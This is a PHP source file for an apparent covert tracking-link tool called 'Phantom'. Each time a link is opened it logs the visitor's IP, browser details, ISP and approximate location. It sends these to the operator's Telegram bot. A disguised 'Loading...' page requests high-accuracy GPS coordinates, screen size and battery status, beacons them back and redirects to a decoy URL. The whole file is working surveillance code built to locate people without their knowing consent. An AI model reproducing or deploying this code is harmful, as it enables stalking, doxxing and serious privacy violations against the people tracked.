<?php
// track.php - Phantom core logger
$config = require __DIR__ . '/config.php';

header('Access-Control-Allow-Origin: *');
header('Cache-Control: no-store, no-cache, must-revalidate');

$trackId = isset($_GET['id']) ? preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['id']) : null;
$redirect = isset($_GET['r']) ? $_GET['r'] : $config['default_redirect'];

if (!$trackId) {
    header('Location: /');
    exit;
}

function getRealIP() {
    $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
    foreach ($headers as $h) {
        if (!empty($_SERVER[$h])) {
            $ip = trim(explode(',', $_SERVER[$h])[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

function sendTelegram($message) {
    global $config;
    if (empty($config['telegram']['enabled'])) return;
    $token = $config['telegram']['bot_token'] ?? '';
    $chat  = $config['telegram']['chat_id'] ?? '';
    if (!$token || !$chat) return;

    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => [
            'chat_id' => $chat,
            'text' => $message,
            'parse_mode' => 'HTML',
            'disable_web_page_preview' => true
        ],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 4
    ]);
    curl_exec($ch);
    curl_close($ch);
}

$ip = getRealIP();
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$ref = $_SERVER['HTTP_REFERER'] ?? '';
$lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '';
$time = date('Y-m-d H:i:s');

// Geo IP
$geo = ['country'=>'','region'=>'','city'=>'','zip'=>'','lat'=>'','lon'=>'','isp'=>'','org'=>'','as'=>'','proxy'=>false,'mobile'=>false];
$geoJson = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,proxy,hosting,mobile");
if ($geoJson) {
    $g = json_decode($geoJson, true);
    if (($g['status'] ?? '') === 'success') {
        $geo = [
            'country' => $g['country'] ?? '',
            'region'  => $g['regionName'] ?? '',
            'city'    => $g['city'] ?? '',
            'zip'     => $g['zip'] ?? '',
            'lat'     => $g['lat'] ?? '',
            'lon'     => $g['lon'] ?? '',
            'isp'     => $g['isp'] ?? '',
            'org'     => $g['org'] ?? '',
            'as'      => $g['as'] ?? '',
            'proxy'   => ($g['proxy'] ?? false) || ($g['hosting'] ?? false),
            'mobile'  => $g['mobile'] ?? false
        ];
    }
}

// Simpan log
$logDir = __DIR__ . '/logs';
if (!is_dir($logDir)) mkdir($logDir, 0755, true);
$logFile = $logDir . '/' . $trackId . '.json';

$entry = [
    'time'    => $time,
    'ip'      => $ip,
    'ua'      => $ua,
    'referer' => $ref,
    'lang'    => $lang,
    'geo'     => $geo,
    'precise' => null,
    'screen'  => null,
    'battery' => null
];

$logs = file_exists($logFile) ? (json_decode(file_get_contents($logFile), true) ?: []) : [];
$logs[] = $entry;
file_put_contents($logFile, json_encode($logs, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

// === TELEGRAM NOTIF OTOMATIS ===
$proxyFlag = $geo['proxy'] ? '⚠️ PROXY/VPN' : '✅ Clean';
$msg = "👻 <b>Phantom Hit</b>\n";
$msg .= "ID: <code>{$trackId}</code>\n";
$msg .= "Time: {$time}\n";
$msg .= "IP: <code>{$ip}</code>\n";
$msg .= "Loc: {$geo['city']}, {$geo['region']}, {$geo['country']}\n";
$msg .= "ZIP: {$geo['zip']}\n";
$msg .= "ISP: {$geo['isp']}\n";
$msg .= "{$proxyFlag}\n";
$msg .= "UA: " . substr($ua, 0, 80) . "...\n";
$msg .= "🔗 <a href=\"{$config['domain']}/liveview.php?id={$trackId}\">Live View</a>";
sendTelegram($msg);

// JS beacon request
if (isset($_GET['js']) || (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest')) {
    // Update last entry with precise data if posted
    $input = json_decode(file_get_contents('php://input'), true);
    if ($input) {
        $logs[count($logs)-1] = array_merge($logs[count($logs)-1], $input);
        file_put_contents($logFile, json_encode($logs, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
        
        // Extra notif kalau dapat precise location
        if (!empty($input['precise']['lat'])) {
            $p = $input['precise'];
            sendTelegram("📍 <b>Precise Location</b>\nID: <code>{$trackId}</code>\nLat: {$p['lat']}\nLon: {$p['lon']}\nAccuracy: {$p['accuracy']}m");
        }
    }
    header('Content-Type: application/json');
    echo json_encode(['ok' => true]);
    exit;
}

// Halaman loading + coba geolocation
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Phantom</title>
<style>
body{margin:0;background:#0b0b0f;color:#e0e0e0;font-family:system-ui,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh}
.loader{text-align:center;opacity:0.6}
</style>
</head>
<body>
<div class="loader"><p>Loading...</p></div>
<script>
(function(){
  const trackId = <?= json_encode($trackId) ?>;
  const redirect = <?= json_encode($redirect) ?>;
  const logUrl = location.pathname + '?id=' + encodeURIComponent(trackId) + '&js=1';

  function send(data) {
    const blob = new Blob([JSON.stringify(data)], {type:'application/json'});
    if (navigator.sendBeacon) navigator.sendBeacon(logUrl, blob);
    else fetch(logUrl, {method:'POST', body:blob, keepalive:true}).catch(()=>{});
  }

  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      pos => {
        send({
          precise: {
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy: pos.coords.accuracy
          },
          screen: screen.width + 'x' + screen.height
        });
        setTimeout(() => location.replace(redirect), 350);
      },
      err => {
        send({precise:null, screen: screen.width + 'x' + screen.height, error: err.message});
        location.replace(redirect);
      },
      {enableHighAccuracy:true, timeout:7000, maximumAge:0}
    );
  } else {
    send({precise:null, screen: screen.width + 'x' + screen.height});
    location.replace(redirect);
  }

  if (navigator.getBattery) {
    navigator.getBattery().then(b => send({battery:{level:b.level, charging:b.charging}})).catch(()=>{});
  }
})();
</script>
</body>
</html>
